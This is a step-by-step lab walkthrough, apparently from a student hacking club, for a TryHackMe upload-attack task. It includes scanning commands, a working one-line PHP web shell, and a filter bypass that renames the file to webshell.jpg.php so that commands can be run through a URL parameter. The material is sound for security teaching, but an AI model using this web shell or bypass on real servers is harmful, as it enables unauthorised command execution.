# HackerFrogs AfterSchool Network Hacking Session 8
## Session Topic: File Upload Attacks /w TryHackMe
# Challenge 1: TryHackMe 25 Days of Cyber Security Room (Task 4)
## TryHackMe Link
https://tryhackme.com/room/learncyberin25days
### YouTube Walkthrough Link
N/A
### Method of Solve
* Step 1: Click on the Task 4 header in the TryHackMe page, then click on the green "Start Machine" button
* Step 2: go to the top of the webpage, and click on the "Start AttackBox" button
* Step 3: wait 2 minutes for the AttackBox to finish loading
* Step 4: after the AttackBox finishes loading, at the bottom-middle of the TryHackMe webpage click on the "View in full screen" button, which looks like two arrows pointing away from each other
* Step 5: in the AttackBox desktop, click on the terminal shortcut button (at the top of the desktop) to open a terminal
* Step 6: in the AttackBox desktop, click on the orange Firefox (at the top of the desktop) to open a web browser
## Part 1: Doing Initial Scans
We will simulate a typical network hacking exercise by doing Nmap and directory busting scans.
* Step 1: In the TryHackMe webpage, note the IP address in the Target Machine Information header. We'll refering to that as the `<IP_address>`
* Step 2: In the AttackBox terminal use the following command to scan the server with Nmap:
```
nmap -vv -sV -sC -T5 <IP_address>
```
The output lets us know that port 80, HTTP, unencrypted websites, are open on the server
* Step 3: Passed on the previous command, we can now do a directory busting attack to determine existing directories on the webserver with Dirb:
```
dirb http://<IP_address>
```
The output of this command lets us know that the /uploads directory exists on the webserver. We'll need this information for later
## Part 2: Investigating the webpage
In this section, we'll be looking at the webpage on the remote server we've been scanning
* Step 1: In the AttackBox web browser, navigate to the following URL:
http://<IP_address>
* Step 2: In the AttackBox web browser, add the following to the end of the URL
```
?id=ODIzODI5MTNiYmYw
```
We see here that there's an upload function the webpage
## Part 3: Attempting to upload an undisguised web shell file
In this section we will upload a webshell file to the remote server
* Step 1: Use the nano text editor to create a webshell file to upload to the server
```
nano webshell.php
```
* Step 2: Copy the following code and paste it into the text editor
```
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```
* Step 3: Save the file by using the `ctrl+x` keyboard shortcut, then `y`, then press the `enter` key
* Step 4: On the AttackBox web browser, click on the `Select` button, then select the `webshell.php file`, which should be in the /root directory, then click `open`
* Step 5: Confirm the upload by clicking on the `Submit` button
Note that the file was unable to be uploaded, because the app is expecting a picture file (jpg, png, gif, etc)
# Part 4: Modifying the webshell file to bypass the web app upload filter
In this section, we attempt to fool the web app into uploading our webshell file
* Step 1: In the AttackBox terminal, rename the webshell file with the following command
```
mv webshell.php webshell.jpg.php
```
This change to the name of the file could be enough to fool the app into uploading the file
* Step 2: On the AttackBox web browser, click on the `Select` button, then select the `webshell.php file`, which should be in the /root directory, then click `open`
* Step 3: Confirm the upload by clicking on the `Submit` button
This time, we've successfully uploaded the file
* Step 4: Recall the fact that the Dirb scan from earlier indicated an `/uploads` directory exists
# Part 5: Accessing and using the webshell
* Step 1: Navigate to the following endpoint in the app `/uploads/webshell.jpg.php`, as in http://<IP_address>/uploads/webshell.jpg.php
You should see a blank page. This is normal. We can run commands through the URL's parameters
* Step 2: On the end of the webpage's URL, add this to the end: `?cmd=whoami`
If the webshell is working, you should see the output `apache`
* Step 8: From here, we can run any commands we want on the uploaded webshell, substituting out `whoami` with any regular Linux command
